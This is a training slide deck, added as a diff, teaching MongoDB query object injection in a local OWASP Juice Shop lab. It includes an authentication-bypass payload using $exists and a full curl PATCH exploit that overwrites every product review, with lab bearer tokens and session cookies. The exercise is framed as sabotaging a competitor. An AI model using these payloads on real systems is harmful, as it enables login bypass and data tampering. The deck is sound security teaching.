@@ -1,0 +1,277 @@
+#+TITLE: NoSQL Injection
+#+DATE: MongoDb Query Object Injection
+#+AUTHOR: Zach Roof
+#+OPTIONS: num:nil toc:nil
+#+OPTIONS: tags:nil
+#+OPTIONS: reveal_center:nil reveal_control:nil width:100% height:100% prop:nil
+#+OPTIONS: reveal_history:t reveal_keyboard:t reveal_overview:t
+#+OPTIONS: reveal_slide_number:nil
+#+OPTIONS: reveal_title_slide:"<h2>%t</h2><h3>%d<h3>"
+#+OPTIONS: reveal_progress:t reveal_rolling_links:nil reveal_single_file:nil
+#+OPTIONS: auto-id:t
+#+REVEAL_HLEVEL: 1
+#+REVEAL_MARGIN: 0
+#+REVEAL_MIN_SCALE: 1
+#+REVEAL_MAX_SCALE: 1
+#+REVEAL_ROOT: .
+#+REVEAL_TRANS: default
+#+REVEAL_SPEED: default
+#+REVEAL_THEME: sts
+#+REVEAL_EXTRA_CSS: css/local.css
+#+REVEAL_INIT_SCRIPT: previewLinks: false
+#+REVEAL_PLUGINS: (classList highlight)
+#+REVEAL_HIGHLIGHT_CSS:%r/lib/highlight.js/src/styles/monokai-sublime.css
+#+REVEAL_HLEVEL: 2
+* NoSQL Injection: MongoDb Query Object Injection
+  :PROPERTIES:
+  :CUSTOM_ID: h-6C0AE174-9CC6-48AF-9C2D-61D94246BF20
+  :END:
+  # :PROPERTIES:
+  # :header-args: :tangle (src_path :tutorial 'injection-fundamentals-4) :mkdirp yes :noweb yes :exports code :src_dir (src_parse :tutorial 'injection-fundamentals-4) :filename (src_path :tutorial 'injection-fundamentals-4)
+  # :CUSTOM_ID: h-CF80E32A-A437-49F9-B392-7CDA7A51D79A
+  # :END:
+** Table Of Contents
+   :PROPERTIES:
+   :CUSTOM_ID: h-E2FCBD6C-BE30-4131-A6AE-844E0BE39093
+   :END:
+- [[#nosql-injection-mongodb-query-object-injection][NoSQL Injection: MongoDb Query Object Injection]]
+  - [[#talk-scope][Talk Scope]]
+  - [[#recap-what-is-nosql-injection-nosqli][Recap: What is NoSQL Injection (NoSQLi)?]]
+  - [[#query-objects][Query Objects]]
+  - [[#exercise-evaluating-injection-risks][Exercise: Evaluating Injection Risks]]
+  - [[#example-query-object-injection][Example: Query Object Injection]]
+  - [[#query-operator-attack-vector][Query Operator Attack Vector]]
+  - [[#query-operators][Query Operators]]
+  - [[#exercise-overview][Exercise Overview]]
+  - [[#exercise-setup][Exercise Setup]]
+  - [[#exercise-assignment][Exercise Assignment]]
+  - [[#solution-find-patch-data][Solution: Find Patch Data]]
+  - [[#solution-construct-payload][Solution: Construct Payload]]
+  - [[#solution-find-api-endpoint-url][Solution: Find API endpoint URL]]
+  - [[#solution-construct-curl-command][Solution: Construct cURL command]]
+  - [[#takeaways][Takeaways]]
+
+** Talk Scope
+   :PROPERTIES:
+   :CUSTOM_ID: h-853FB39F-D352-437D-BFA7-1B19A6A40BC7-scope
+   :END:
+1. Learn about Mongo's Query Objects, and how they can circumvent server-side password validation
+2. Interactive Exercise: Reconnaissance of client-side javascript to find API endpoints
+   and associated payload
+2. Interactive Exercise: Use Query Object injection to update all product reviews within
+   Owasp's Juice Shop
+
+** Recap: What is NoSQL Injection (NoSQLi)?
+   :PROPERTIES:
+   :CUSTOM_ID: h-F25B40DC-874D-4063-808C-B412389842B4
+   :END:
++ Introduced when developers create dynamic database queries that include user
+  supplied input (untrusted input)
++ What unexpected input types could we receive?
+    + Binary
+  + Query Object
+  + Others
+
+** Query Objects
+   :PROPERTIES:
+   :CUSTOM_ID: h-90237551-9DA2-4CA4-9C14-8AB0390F73F3
+   :END:
+#+BEGIN_SRC mongo :noweb yes :export code
+  // Mongo shell syntax (dev syntax is very similar)
+  db.accounts.find({username: username_value, password: password_value});
+
+  // Find method signature
+  db.collection.find(query[[[, fields], options], callback]);
+#+END_SRC
++ ~{username: username_value, password: password_value}~
+  + Query Object that can be leveraged to validate username/password
+        + Query Objects contain logic
+      + If more than one field is specified, it's an ~AND~ query
+
+** Exercise: Evaluating Injection Risks
+   :PROPERTIES:
+   :CUSTOM_ID: h-8E6F41B5-66D7-4072-901D-4FE6C620623E
+   :END:
+#+BEGIN_SRC mongo :noweb yes :export code
+  db.accounts.find({username: username_value, password: password_value});
+#+END_SRC
++ [[https://sts.tools/nosqi-from-beginner-to-bson-injection][BSON injection course]] recap
+  + Validation issues within an underlying library could allow an attacker to
+    inject ~username_value~ / ~password_value~ with unexpected characters
++ Assume that the underlying libraries /are/ validating correctly, how could one
+  attack ~username_value~ / ~password_value~?
+  + Hint: Usually the issues are right in front of you
++ Answer: Nested Query Objects
+
+** Example: Query Object Injection
+   :PROPERTIES:
+   :CUSTOM_ID: h-01AFFDD9-3C18-45C5-8977-E18F26BD15C5
+   :END:
+#+BEGIN_SRC mongo :noweb yes :export code
+  db.accounts.find({username: username_value, password: password_value});
+#+END_SRC
+#+BEGIN_SRC json :noweb yes :export code
+{
+    "username": "admin",
+    "password": {$exists: true}
+}
+#+END_SRC
++ Set ~password_value~ equal to another query object
++ What is ~$exists~?
+  + Query Operator
+
+** Query Operator Attack Vector
+   :PROPERTIES:
+   :CUSTOM_ID: h-76434B60-0819-4CFB-A34C-149919CC2418
+   :END:
+#+BEGIN_SRC json :noweb yes :export code
+{
+    "username": "admin",
+    "password": {$exists: true}
+}
+#+END_SRC
++ To subvert the validation condition, an attacker can try to inject query
+  objects that evaluate to ~true~
+
+** Query Operators
+   :PROPERTIES:
+   :CUSTOM_ID: h-CDFCCE27-13BB-4180-A079-DD0D4C42CB53
+   :END:
++ [[https://docs.mongodb.com/manual/reference/operator/query/][Query Operators]]
+    + Comparison
+    + Ex: ~{$gt: 0}~
+  + Logical
+    + Ex: ~{$not: ""}~
+  + Element
+    + Ex: ~{$exists: true}~
+  + Evaluation
+    + ~$where~
+    + Matches documents that satisfy a JavaScript expression
+  + Comment
+    + ~db.collection.find( { <query>, $comment: <comment> } )~
+      + XSS Log injection
+
+** Exercise Overview
+   :PROPERTIES:
+   :CUSTOM_ID: h-2A626C58-FA27-48F1-B6B0-027087F5480D
+   :END:
++ Scenario
+    + You are a Juice Shop owner and you're trying to degrade the reputation of your competition
+  + You want all preexisting reviews to be altered and display your message
+  + Threat modeling
+    + The financially motivated attacker
+    + Not always "You've been PAWNED! You suck! Muhaha"
++ Attack Steps
+    1. Evaluate client-side code to find API endpoint
+  2. Leverage query object injection to update all reviews
+
+** Exercise Setup
+   :PROPERTIES:
+   :CUSTOM_ID: h-0D6B2303-7A5B-48E4-B12C-A8085D596BCE
+   :END:
+1. ~docker run -p 3000:3000 securingthestack/juice-shop:nosqli-object-injection~
+2. View [[http://localhost:3000][http://localhost:3000]] in Google Chrome
+3. Create new user and log in
+4. Chrome Dev Tools
+   1. ~dist/juice-shop.min.js~
+   2. Pretty Print
+      1. Search for ~patch~
+5. Click on a product from the main page and submit a product review
+   1. ~Copy as cURL~ to give yourself a template
+
+** Exercise Assignment
+   :PROPERTIES:
+   :CUSTOM_ID: h-C20D82A3-6167-4194-821B-10FF44F1CF40
+   :END:
+- Leverage the code (relevant code linked to ~patch~), curl template, and query object injection to update every
+  review on the site
+- Hint
+    - Focus on the ~id~ field for the query object injection
+  - ~{ "id": X, "message": X }~
+
+** Solution: Find Patch Data
+   :PROPERTIES:
+   :CUSTOM_ID: h-8EB128D8-24EF-47F6-8A5B-3D56E638BA67
+   :END:
+#+BEGIN_SRC javascript :noweb yes :export code
+angular.module("juiceShop").controller("ProductReviewEditController", ["$scope", "$uibModalInstance", "ProductReviewService", "review", function(n, e, t, o) {
+    "use strict";
+    n.id = o._id,
+    n.message = o.message,
+    n.editReview = function() {
+        t.patch({
+            id: n.id,
+            message: n.message
+        }).then(function() {
+            e.close(n.message)
+        }).catch(function(e) {
+            console.log(e),
+            n.err = e
+        })
+    }
+}
+#+END_SRC
+
+** Solution: Construct Payload
+   :PROPERTIES:
+   :CUSTOM_ID: h-C69B9E33-A82E-42E2-9B5E-B078BB33E6A5
+   :END:
+#+BEGIN_SRC json :noweb yes :export code
+{ "id": { "$exists": true }, "message": "I cant believe how SOUR this juice was!!" }
+#+END_SRC
+
+** Solution: Find API endpoint URL
+   :PROPERTIES:
+   :CUSTOM_ID: h-16C7C774-7CA1-4B83-A5A1-3EF714A009AD
+   :END:
+#+BEGIN_SRC javascript :noweb yes :export code
+  angular.module("juiceShop").factory("ProductReviewService", ["$http", "$q", function(o, a) {
+      "use strict";
+      var r = "/rest/product";
+      return {
+          // ...snip...
+          patch: function(e) {
+              var n = a.defer();
+              return o.patch(r + "/reviews", e).then(function(e) {
+                  n.resolve(e.data.data)
+              }).catch(function(e) {
+                  n.reject(e.data)
+              }),
+              n.promise
+          }
+      }
+  }
+#+END_SRC
+
+** Solution: Construct cURL command
+   :PROPERTIES:
+   :CUSTOM_ID: h-438341AD-9CF7-4B3E-9A04-E928D34725AC
+   :END:
+#+BEGIN_SRC text :noweb yes :export code
+  curl 'http://localhost:3000/rest/product/reviews' -X PATCH -H 'Pragma: no-cache'
+  -H 'Origin: http://localhost:3000' -H 'Accept-Encoding: gzip, deflate, br' -H
+  'Accept-Language: en-US,en;q=0.9' -H 'Authorization: Bearer
+  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6OSwiZW1haWwiOiJmb29AZm9vLmNvbSIsInBhc3N3b3JkIjoiZmRiYTk4OTcwOTYxZWRiMjlmODgyNDFiOWQ5OWQ4OTAiLCJjcmVhdGVkQXQiOiIyMDE4LTA3LTIyIDIyOjA4OjE4LjA0OSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTA3LTIyIDIyOjA4OjE4LjA0OSArMDA6MDAifSwiaWF0IjoxNTMyMjk3MzE4LCJleHAiOjE1MzIzMTUzMTh9.u19Fl-GcuZvNSaFDgzYFIKFrnpGnhTZTMqV0s-ZVSB7cJDWPaLgfdG3hYA0Wb7MgbZQFzHV_BcLzoHKRkJe-T_p_8E6LhUyr9A6VWbTt9f9IHEyeXH6EqmuM3WkeTkB8cgDqVpOiLLz8K9U6-B6z5yThnECwKbrinRTWgoT2g3E'
+  -H 'Content-Type: application/json;charset=UTF-8' -H 'Accept: application/json,
+  text/plain, */*' -H 'Cache-Control: no-cache' -H 'User-Agent: Mozilla/5.0
+  (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko)
+  Chrome/67.0.3396.99 Safari/537.36' -H 'Cookie:
+  connect.sid=s%3AkVWjF7LgDglaiBddGx4d-i0ZZIkXRC7T.atB7Ffy5NCMywjOCiL51vNAcWb5rt5aCw%2BuS5x7eWMw;
+  cookieconsent_status=dismiss; language=en;
+  i18next=en;
+  continueCode=DLz1ZK8EnQbOajlDeV71P9Jp5wyLA6m0oMBN2XrKx4RmvzZ6k3YqWgaE74yj;
+  io=rwn8sIR1IsKAeZhUAAAD;
+  token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6OSwiZW1haWwiOiJmb29AZm9vLmNvbSIsInBhc3N3b3JkIjoiZmRiYTk4OTcwOTYxZWRiMjlmODgyNDFiOWQ5OWQ4OTAiLCJjcmVhdGVkQXQiOiIyMDE4LTA3LTIyIDIyOjA4OjE4LjA0OSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTA3LTIyIDIyOjA4OjE4LjA0OSArMDA6MDAifSwiaWF0IjoxNTMyMjk3MzE4LCJleHAiOjE1MzIzMTUzMTh9.u19Fl-GcuZvNSaFDgzYFIKFrnpGnhTZTMqV0s-ZVSB7cJDWPaLgfdG3hYA0Wb7MgbZQFzHV_BcLzoHKRkJe-T_p_8E6LhUyr9A6VWbTt9f9IHEyeXH6EqmuM3WkeTkB8cgDqVpOiLLz8K9U6-B6z5yThnECwKbrinRTWgoT2g3E'
+  -H 'Connection: keep-alive' -H 'Referer: http://localhost:3000/' -H 'DNT: 1'
+  --data-binary '{ "id": { "$exists": true }, "message": "I cant believe how SOUR this juice
+      was!!" }' --compressed
+#+END_SRC
+
+** Takeaways
+   :PROPERTIES:
+   :CUSTOM_ID: h-6B101571-BAF6-4F92-98F0-F4D5203EBE63
+   :END:
++ Attackers profile Javascript to deduce admin functionality (or functionality
+  that isn't immediately available within the application)
++ Input Validation
+  + Regular Expressions aren't enough, we must also validate type
